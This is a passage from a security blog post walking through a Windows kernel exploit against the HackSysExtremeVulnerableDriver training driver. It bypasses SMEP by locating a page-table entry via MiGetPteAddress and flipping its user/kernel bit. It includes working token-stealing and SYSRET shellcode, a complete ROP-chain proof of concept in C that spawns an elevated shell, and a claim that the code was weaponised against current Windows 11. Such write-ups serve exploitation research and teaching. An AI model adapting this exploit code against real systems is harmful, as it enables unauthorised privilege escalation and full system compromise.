fffff800`4d67f781 48b80000000080f0ffff    mov rax,0FFFFF08000000000h
fffff800`4d67f78b 4803c1                  add     rax,rcx
fffff800`4d67f78e c3                      ret
</code></pre><p>From what I’ve seen in the “wild”, people normally use this function to get the base address of all PTE’s. Let’s take a step back and ask ourselves what does this function actually do when called? We don’t even need Ghidra for this to be honest. Let’s write the C equivalent to this:</p>
<div><pre tabindex="0"><code data-lang="c"><span><span><span>/* wetw0rk */</span>
</span></span><span><span>
</span></span><span><span><span>#include</span> <span>&lt;stdio.h&gt;</span><span>
</span></span></span><span><span><span>#include</span> <span>&lt;stdint.h&gt;</span><span>
</span></span></span><span><span><span></span>
</span></span><span><span><span>int64_t</span> <span>MiGetPteAddress</span>(<span>int64_t</span> rcx)
</span></span><span><span>{
</span></span><span><span>    <span>int64_t</span> rax <span>=</span> <span>0x00</span>;
</span></span><span><span>
</span></span><span><span>    rcx <span>=</span> rcx <span>&gt;&gt;</span> <span>9</span>;
</span></span><span><span>    rax <span>=</span> <span>0x7FFFFFFFF8</span>;
</span></span><span><span>    rcx <span>=</span> rcx <span>&amp;</span> rax;
</span></span><span><span>    rax <span>=</span> <span>0x0FFFFF08000000000</span>;
</span></span><span><span>    rax <span>=</span> rax <span>+</span> rcx;
</span></span><span><span>    <span>return</span> rax;
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>int</span> <span>main</span>() {
</span></span><span><span>    <span>printf</span>(<span>&#34;PTE Located @{ 0x%llx }</span><span>\n</span><span>&#34;</span>, <span>MiGetPteAddress</span>(<span>0x00000220c16d0000</span>));
</span></span><span><span>}
</span></span></code></pre></div><p>If we compile this we see it gives us the the address of the PTE.</p>
<pre tabindex="0"><code>┌──(wetw0rk㉿kali)-[~]
└─$ gcc MiGetPteAddress.c -o meme
                                                                                                                                                                                                                                             
┌──(wetw0rk㉿kali)-[~]
└─$ ./meme 
PTE Located @{ 0xfffff0811060b680 }
</code></pre><p>This means we can leverage this existing function to manipulate the PTE directly. After all, we are running under the context of the Kernel so we can call Bill Gates if we want to. To summarize all we need to do is pass this function the address of our shellcode and in return this function will return the PTE respective to our allocation. How nice :)</p>
<p>Once we have the address of the PTE, we simply dereference it and flip the <code>U</code> bit to a <code>K</code> bit. What insane mathematical operation must we do to accomplish such a task?</p>
<p>That’s right - XOR!</p>
<pre tabindex="0"><code>&gt;&gt;&gt; &#34;0x&#34; + hex(0x0000000226D83867 ^ 4)[2:].zfill(16)
&#39;0x0000000226d83863&#39;
</code></pre><p>You know what this means right?</p>
<p><img src="https://wetw0rk.github.io/0x01-Killing-Windows-Kernel-Mitigations/captain.gif" alt="alt text"/></p>

<p>At this point we have everything we need to get code execution… except returning to Userland. Normally it’s best to restore execution flow manually. However, I decided to instead use <a href="https://kristal-g.github.io/2021/05/08/SYSRET_Shellcode.html">Kristal-G’s SYSRET</a> shellcode - a technique that allows for a generic return from the Kernel. From my understanding this is the first of its kind (other than the <a href="https://github.com/vnik5287/sock_diag_x64/blob/486ce10dbef95776b22f228a74afe39ec9a0e16c/sockdiag_smep.c#L59">Linux variant</a>). You can generate Kristal-G’s shellcode using <a href="https://github.com/wetw0rk/Sickle">Sickle</a> as shown below:</p>
<div><pre tabindex="0"><code data-lang="bash"><span><span>┌──<span>(</span>wetw0rk㉿kali<span>)</span>-<span>[</span>/opt/Sickle/src<span>]</span>
</span></span><span><span>└─$ python3 sickle.py -p windows/x64/kernel_sysret -f c -m pinpoint
</span></span><span><span><span>&#34;\x65\x48\xa1\x88\x01\x00\x00\x00\x00\x00\x00&#34;</span> // movabs rax, qword ptr gs:<span>[</span>0x188<span>]</span>
</span></span><span><span><span>&#34;\x66\x8b\x88\xe4\x01\x00\x00&#34;</span>                 // mov cx, word ptr <span>[</span>rax + 0x1e4<span>]</span>
</span></span><span><span><span>&#34;\x66\xff\xc1&#34;</span>                                 // inc cx
</span></span><span><span><span>&#34;\x66\x89\x88\xe4\x01\x00\x00&#34;</span>                 // mov word ptr <span>[</span>rax + 0x1e4<span>]</span>, cx
</span></span><span><span><span>&#34;\x48\x8b\x90\x90\x00\x00\x00&#34;</span>                 // mov rdx, qword ptr <span>[</span>rax + 0x90<span>]</span>
</span></span><span><span><span>&#34;\x48\x8b\x8a\x68\x01\x00\x00&#34;</span>                 // mov rcx, qword ptr <span>[</span>rdx + 0x168<span>]</span>
</span></span><span><span><span>&#34;\x4c\x8b\x9a\x78\x01\x00\x00&#34;</span>                 // mov r11, qword ptr <span>[</span>rdx + 0x178<span>]</span>
</span></span><span><span><span>&#34;\x48\x8b\xa2\x80\x01\x00\x00&#34;</span>                 // mov rsp, qword ptr <span>[</span>rdx + 0x180<span>]</span>
</span></span><span><span><span>&#34;\x48\x8b\xaa\x58\x01\x00\x00&#34;</span>                 // mov rbp, qword ptr <span>[</span>rdx + 0x158<span>]</span>
</span></span><span><span><span>&#34;\x31\xc0&#34;</span>                                     // xor eax, eax
</span></span><span><span><span>&#34;\x0f\x01\xf8&#34;</span>                                 // swapgs 
</span></span><span><span><span>&#34;\x48\x0f\x07&#34;</span>                                 // sysretq
</span></span></code></pre></div><p>Below is the PoC code, however offsets may be different on your build of Windows.</p>
<div><pre tabindex="0"><code data-lang="c"><span><span><span>#include</span> <span>&lt;stdio.h&gt;</span><span>
</span></span></span><span><span><span>#include</span> <span>&lt;stdlib.h&gt;</span><span>
</span></span></span><span><span><span>#include</span> <span>&lt;stdint.h&gt;</span><span>
</span></span></span><span><span><span></span>
</span></span><span><span><span>#include</span> <span>&lt;windows.h&gt;</span><span>
</span></span></span><span><span><span>#include</span> <span>&lt;psapi.h&gt;</span><span>
</span></span></span><span><span><span></span>
</span></span><span><span><span>// I/O Request Packets (IRPs)
</span></span></span><span><span><span></span><span>#define TRIGGER_BUFFER_OVERFLOW_STACK 0x222003
</span></span></span><span><span><span></span>
</span></span><span><span><span>#define BUFFER_SIZE 4242
</span></span></span><span><span><span></span>
</span></span><span><span><span>uint64_t</span> <span>GetKernelBaseAddress</span>()
</span></span><span><span>{
</span></span><span><span>    ULONG_PTR pKernelBaseAddress <span>=</span> <span>0</span>;
</span></span><span><span>    LPVOID <span>*</span>lpImageBase <span>=</span> NULL;
</span></span><span><span>    DWORD dwBytesNeeded <span>=</span> <span>0</span>;
</span></span><span><span>
</span></span><span><span>    <span>if</span> (<span>!</span><span>EnumDeviceDrivers</span>(NULL, <span>0</span>, <span>&amp;</span>dwBytesNeeded)) {
</span></span><span><span>        <span>printf</span>(<span>&#34;[-] Failed to calculate bytes needed for device driver entries&#34;</span>);
</span></span><span><span>        <span>return</span> <span>-</span><span>1</span>;
</span></span><span><span>    }
</span></span><span><span>
</span></span><span><span>    <span>if</span> (<span>!</span>(lpImageBase <span>=</span> (LPVOID <span>*</span>)<span>HeapAlloc</span>(<span>GetProcessHeap</span>(), <span>0</span>, dwBytesNeeded))) {
</span></span><span><span>        <span>printf</span>(<span>&#34;[-] Failed to allocate heap for lpImageBase</span><span>\n</span><span>&#34;</span>);
</span></span><span><span>        <span>if</span> (lpImageBase) {
</span></span><span><span>            <span>HeapFree</span>(<span>GetProcessHeap</span>(), <span>0</span>, lpImageBase);
</span></span><span><span>        }
</span></span><span><span>        <span>return</span> <span>-</span><span>1</span>;
</span></span><span><span>    }
</span></span><span><span>
</span></span><span><span>    <span>if</span> (<span>!</span><span>EnumDeviceDrivers</span>(lpImageBase, dwBytesNeeded, <span>&amp;</span>dwBytesNeeded)) {
</span></span><span><span>        <span>printf</span>(<span>&#34;[-] EnumDeviceDrivers: %d&#34;</span>, <span>GetLastError</span>());
</span></span><span><span>        <span>if</span> (lpImageBase) {
</span></span><span><span>            <span>HeapFree</span>(<span>GetProcessHeap</span>(), <span>0</span>, lpImageBase);
</span></span><span><span>        }
</span></span><span><span>        <span>return</span> <span>-</span><span>1</span>;
</span></span><span><span>    }
</span></span><span><span>
</span></span><span><span>    pKernelBaseAddress <span>=</span> ((ULONG_PTR <span>*</span>)lpImageBase)[<span>0</span>];
</span></span><span><span>    <span>HeapFree</span>(<span>GetProcessHeap</span>(), <span>0</span>, lpImageBase);
</span></span><span><span>
</span></span><span><span>    <span>printf</span>(<span>&#34;[*] Kernel Base Address: %llx</span><span>\n</span><span>&#34;</span>, pKernelBaseAddress);
</span></span><span><span>
</span></span><span><span>    <span>return</span> pKernelBaseAddress;
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>void</span> <span>GenerateBuffer</span>(<span>int64_t</span> <span>*</span>buffer, <span>int64_t</span> kernel_base, LPVOID shellcode)
</span></span><span><span>{
</span></span><span><span>    <span>int64_t</span> i <span>=</span> <span>259</span>;
</span></span><span><span>    <span>int64_t</span> j <span>=</span> <span>0</span>;
</span></span><span><span>
</span></span><span><span>    <span>printf</span>(<span>&#34;[*] Generating buffer to bypass VPS and disable SMEP</span><span>\n</span><span>&#34;</span>);
</span></span><span><span>
</span></span><span><span>    <span>/* Prepare RDX register for later. This is needed for the XOR operation */</span>
</span></span><span><span>    buffer[i<span>++</span>] <span>=</span> kernel_base <span>+</span> <span>0x3f99ce</span>; <span>// pop rdx ; pop rax ; pop rcx ; ret [nt]
</span></span></span><span><span><span></span>    buffer[i<span>++</span>] <span>=</span>               <span>0x000008</span>; <span>// Set RDX to 0x08, we will need this to accomplish the XOR
</span></span></span><span><span><span></span>    buffer[i<span>++</span>] <span>=</span>               <span>0x000000</span>; <span>// [filler]
</span></span></span><span><span><span></span>    buffer[i<span>++</span>] <span>=</span>               <span>0x000000</span>; <span>// [filler]
</span></span></span><span><span><span></span>
</span></span><span><span>    <span>/* Setup the call to MiGetPteAddress in order to get the address of the PTE for our
</span></span></span><span><span><span>       userland code. The setup is as follows:
</span></span></span><span><span><span>  
</span></span></span><span><span><span>         RAX -&gt; VOID *MiGetPteAddress(
</span></span></span><span><span><span>           ( RCX == PTE / Userland Code )
</span></span></span><span><span><span>         );
</span></span></span><span><span><span>
</span></span></span><span><span><span>       Once the call is complete RAX should contain the pointer to our PTE. */</span>
</span></span><span><span>    buffer[i<span>++</span>] <span>=</span> kernel_base <span>+</span> <span>0xa74d93</span>; <span>// pop rcx ; ret     [nt]
</span></span></span><span><span><span></span>    buffer[i<span>++</span>] <span>=</span> (<span>int64_t</span>)shellcode;     <span>// *shellcode        [nt]
</span></span></span><span><span><span></span>    buffer[i<span>++</span>] <span>=</span> kernel_base <span>+</span> <span>0x26b560</span>; <span>// MiGetPteAddress() [nt]
</span></span></span><span><span><span></span>
</span></span><span><span>    <span>/* Now that we have obtained the PTE address, we can modify the 2nd bit in order to
</span></span></span><span><span><span>       mark the page as a kernel page (U -&gt; K). We can do this using XOR ;) */</span>
</span></span><span><span>    buffer[i<span>++</span>] <span>=</span> kernel_base <span>+</span> <span>0x2ffbfb</span>; <span>// sub rax, rdx ; ret                [nt]
</span></span></span><span><span><span></span>    buffer[i<span>++</span>] <span>=</span> kernel_base <span>+</span> <span>0xa6f2f5</span>; <span>// push rax ; pop rbx ; ret          [nt]
</span></span></span><span><span><span></span>    buffer[i<span>++</span>] <span>=</span> kernel_base <span>+</span> <span>0x3f99ce</span>; <span>// pop rdx ; pop rax ; pop rcx ; ret [nt]
</span></span></span><span><span><span></span>    buffer[i<span>++</span>] <span>=</span>               <span>0x000004</span>; <span>// When we XOR the PTE by 0x4 we flip the 2nd bit (U -&gt; K)
</span></span></span><span><span><span></span>    buffer[i<span>++</span>] <span>=</span>               <span>0x000000</span>; <span>// [filler]
</span></span></span><span><span><span></span>    buffer[i<span>++</span>] <span>=</span>               <span>0x000000</span>; <span>// [filler]
</span></span></span><span><span><span></span>    buffer[i<span>++</span>] <span>=</span> kernel_base <span>+</span> <span>0x2107b2</span>; <span>// xor  [rbx+0x08], edx ; mov rbx, qword [rsp+0x60] ; add rsp, 0x40 ; pop r14 ; pop rdi ; pop rbp ; ret [nt]
</span></span></span><span><span><span></span>
</span></span><span><span>    <span>/* Now we can spray our shellcode address since SMEP and VPS should be bypassed */</span>
</span></span><span><span>    <span>for</span> (j <span>=</span> <span>0</span>; j <span>&lt;</span> <span>0xC</span>; j<span>++</span>) {
</span></span><span><span>        buffer[i<span>++</span>] <span>=</span> (<span>int64_t</span>)shellcode;
</span></span><span><span>    }
</span></span><span><span>
</span></span><span><span>    <span>printf</span>(<span>&#34;[*] Calling shellcode: 0x%p</span><span>\n</span><span>&#34;</span>, shellcode);
</span></span><span><span>}
</span></span><span><span>
</span></span><span><span><span>int</span> <span>main</span>()
</span></span><span><span>{
</span></span><span><span>    HANDLE hHEVD                          <span>=</span> NULL;
</span></span><span><span>    DWORD bytesReturned                   <span>=</span> <span>0</span>;
</span></span><span><span>    <span>int64_t</span> buffer[BUFFER_SIZE]           <span>=</span> {<span>0</span>};
</span></span><span><span>    <span>int64_t</span> kernelBaseAddr                <span>=</span> <span>0</span>;
</span></span><span><span>    LPVOID lpMemory                       <span>=</span> NULL;
</span></span><span><span>
</span></span><span><span>    <span>char</span> shellcode[] <span>=</span>
</span></span><span><span>    <span>// python3 sickle.py -p windows/x64/kernel_token_stealer -f c -m pinpoint
</span></span></span><span><span><span></span>    <span>&#34;</span><span>\x65\x48\xa1\x88\x01\x00\x00\x00\x00\x00\x00</span><span>&#34;</span> <span>// movabs rax, qword ptr gs:[0x188]
</span></span></span><span><span><span></span>    <span>&#34;</span><span>\x48\x8b\x80\xb8\x00\x00\x00</span><span>&#34;</span>                 <span>// mov rax, qword ptr [rax + 0xb8]
</span></span></span><span><span><span></span>    <span>&#34;</span><span>\x48\x89\xc1</span><span>&#34;</span>                                 <span>// mov rcx, rax
</span></span></span><span><span><span></span>    <span>&#34;</span><span>\xb2\x04</span><span>&#34;</span>                                     <span>// mov dl, 4
</span></span></span><span><span><span></span>    <span>&#34;</span><span>\x48\x8b\x80\x48\x04\x00\x00</span><span>&#34;</span>                 <span>// mov rax, qword ptr [rax + 0x448]
</span></span></span><span><span><span></span>    <span>&#34;</span><span>\x48\x2d\x48\x04\x00\x00</span><span>&#34;</span>                     <span>// sub rax, 0x448
</span></span></span><span><span><span></span>    <span>&#34;</span><span>\x38\x90\x40\x04\x00\x00</span><span>&#34;</span>                     <span>// cmp byte ptr [rax + 0x440], dl
</span></span></span><span><span><span></span>    <span>&#34;</span><span>\x75\xeb</span><span>&#34;</span>                                     <span>// jne 0x1017
</span></span></span><span><span><span></span>    <span>&#34;</span><span>\x48\x8b\x90\xb8\x04\x00\x00</span><span>&#34;</span>                 <span>// mov rdx, qword ptr [rax + 0x4b8]
</span></span></span><span><span><span></span>    <span>&#34;</span><span>\x48\x89\x91\xb8\x04\x00\x00</span><span>&#34;</span>                 <span>// mov qword ptr [rcx + 0x4b8], rdx
</span></span></span><span><span><span></span> 
</span></span><span><span>    <span>// python3 sickle.py -p windows/x64/kernel_sysret -f c -m pinpoint
</span></span></span><span><span><span></span>    <span>&#34;</span><span>\x65\x48\xa1\x88\x01\x00\x00\x00\x00\x00\x00</span><span>&#34;</span> <span>// movabs rax, qword ptr gs:[0x188]
</span></span></span><span><span><span></span>    <span>&#34;</span><span>\x66\x8b\x88\xe4\x01\x00\x00</span><span>&#34;</span>                 <span>// mov cx, word ptr [rax + 0x1e4]
</span></span></span><span><span><span></span>    <span>&#34;</span><span>\x66\xff\xc1</span><span>&#34;</span>                                 <span>// inc cx
</span></span></span><span><span><span></span>    <span>&#34;</span><span>\x66\x89\x88\xe4\x01\x00\x00</span><span>&#34;</span>                 <span>// mov word ptr [rax + 0x1e4], cx
</span></span></span><span><span><span></span>    <span>&#34;</span><span>\x48\x8b\x90\x90\x00\x00\x00</span><span>&#34;</span>                 <span>// mov rdx, qword ptr [rax + 0x90]
</span></span></span><span><span><span></span>    <span>&#34;</span><span>\x48\x8b\x8a\x68\x01\x00\x00</span><span>&#34;</span>                 <span>// mov rcx, qword ptr [rdx + 0x168]
</span></span></span><span><span><span></span>    <span>&#34;</span><span>\x4c\x8b\x9a\x78\x01\x00\x00</span><span>&#34;</span>                 <span>// mov r11, qword ptr [rdx + 0x178]
</span></span></span><span><span><span></span>    <span>&#34;</span><span>\x48\x8b\xa2\x80\x01\x00\x00</span><span>&#34;</span>                 <span>// mov rsp, qword ptr [rdx + 0x180]
</span></span></span><span><span><span></span>    <span>&#34;</span><span>\x48\x8b\xaa\x58\x01\x00\x00</span><span>&#34;</span>                 <span>// mov rbp, qword ptr [rdx + 0x158]
</span></span></span><span><span><span></span>    <span>&#34;</span><span>\x31\xc0</span><span>&#34;</span>                                     <span>// xor eax, eax
</span></span></span><span><span><span></span>    <span>&#34;</span><span>\x0f\x01\xf8</span><span>&#34;</span>                                 <span>// swapgs 
</span></span></span><span><span><span></span>    <span>&#34;</span><span>\x48\x0f\x07</span><span>&#34;</span>;                                <span>// sysretq
</span></span></span><span><span><span></span>
</span></span><span><span>
</span></span><span><span>    <span>int</span> shellcodeLength <span>=</span> (<span>58</span> <span>+</span> <span>71</span>);
</span></span><span><span>
</span></span><span><span>    kernelBaseAddr <span>=</span> <span>GetKernelBaseAddress</span>();
</span></span><span><span>
</span></span><span><span>    <span>printf</span>(<span>&#34;[*] Getting a handle on HEVD</span><span>\n</span><span>&#34;</span>);
</span></span><span><span>
</span></span><span><span>    hHEVD <span>=</span> <span>CreateFileA</span>(<span>&#34;</span><span>\\\\</span><span>.</span><span>\\</span><span>HackSysExtremeVulnerableDriver&#34;</span>,
</span></span><span><span>                        (GENERIC_READ <span>|</span> GENERIC_WRITE),
</span></span><span><span>                        <span>0x00</span>,
</span></span><span><span>                        NULL,
</span></span><span><span>                        OPEN_EXISTING,
</span></span><span><span>                        FILE_ATTRIBUTE_NORMAL,
</span></span><span><span>                        NULL);
</span></span><span><span>
</span></span><span><span>    <span>if</span> (hHEVD <span>==</span> INVALID_HANDLE_VALUE)
</span></span><span><span>    {
</span></span><span><span>        <span>printf</span>(<span>&#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver</span><span>\n</span><span>&#34;</span>);
</span></span><span><span>        <span>return</span> <span>-</span><span>1</span>;
</span></span><span><span>    }
</span></span><span><span>
</span></span><span><span>    <span>printf</span>(<span>&#34;[*] Allocating RWX memory</span><span>\n</span><span>&#34;</span>);
</span></span><span><span>    lpMemory <span>=</span> <span>VirtualAlloc</span>(NULL,
</span></span><span><span>                            shellcodeLength,
</span></span><span><span>                            (MEM_COMMIT <span>|</span> MEM_RESERVE),
</span></span><span><span>                            PAGE_EXECUTE_READWRITE);
</span></span><span><span>
</span></span><span><span>    <span>printf</span>(<span>&#34;[*] Copying shellcode into RWX memory</span><span>\n</span><span>&#34;</span>);
</span></span><span><span>    <span>memcpy</span>(lpMemory, shellcode, shellcodeLength);
</span></span><span><span>
</span></span><span><span>    <span>printf</span>(<span>&#34;[*] Spraying return address: 0x%p</span><span>\n</span><span>&#34;</span>, lpMemory);
</span></span><span><span>    <span>GenerateBuffer</span>(buffer, kernelBaseAddr, lpMemory);
</span></span><span><span>
</span></span><span><span>    <span>printf</span>(<span>&#34;[*] Triggering control code 0x222003</span><span>\n</span><span>&#34;</span>);
</span></span><span><span>    <span>DeviceIoControl</span>(hHEVD,
</span></span><span><span>                    TRIGGER_BUFFER_OVERFLOW_STACK,
</span></span><span><span>                    buffer,
</span></span><span><span>                    BUFFER_SIZE,
</span></span><span><span>                    NULL,
</span></span><span><span>                    <span>0x00</span>,
</span></span><span><span>                    <span>&amp;</span>bytesReturned,
</span></span><span><span>                    NULL);
</span></span><span><span>
</span></span><span><span>    <span>system</span>(<span>&#34;C:</span><span>\\</span><span>Windows</span><span>\\</span><span>System32</span><span>\\</span><span>cmd.exe&#34;</span>);
</span></span><span><span>}
</span></span></code></pre></div>
<p>When writing this post I was so confident in my technique I decided to weaponize it and test it against the latest build of Windows 11, and it worked!</p>
<p><img src="https://wetw0rk.github.io/0x01-Killing-Windows-Kernel-Mitigations/poc.gif" alt="alt text"/></p>
<p>It’s important to keep in mind I had to perform modifications to the aforementioned information. As an example, Token Stealing Shellcode offsets have changed, this was an interesting observation and I plan to update shellcode within Sickle to perform version checking for accurate structure offsets.</p>

<pre tabindex="0"><code>https://connormcgarr.github.io/pte-overwrites/
https://m0uk4.gitbook.io/notebooks/mouka/windowsinternal/find-kernel-module-address-todo
https://wumb0.in/finding-the-base-of-the-windows-kernel.html
https://idafchev.github.io/research/2023/06/30/Vulnerable_Driver_Part2.html
https://fluidattacks.com/blog/hevd-smep-bypass/
https://h0mbre.github.io/HEVD_Stackoverflow_SMEP_Bypass_64bit/#
https://www.coresecurity.com/sites/default/files/2020-06/Windows%20SMEP%20bypass%20U%20equals%20S_0.pdf
https://kristal-g.github.io/2021/02/07/HEVD_StackOverflowGS_Windows_10_RS5_x64.html
</code></pre>
    </div>
    
  </article>

    </div></div>
  </body>
</html>
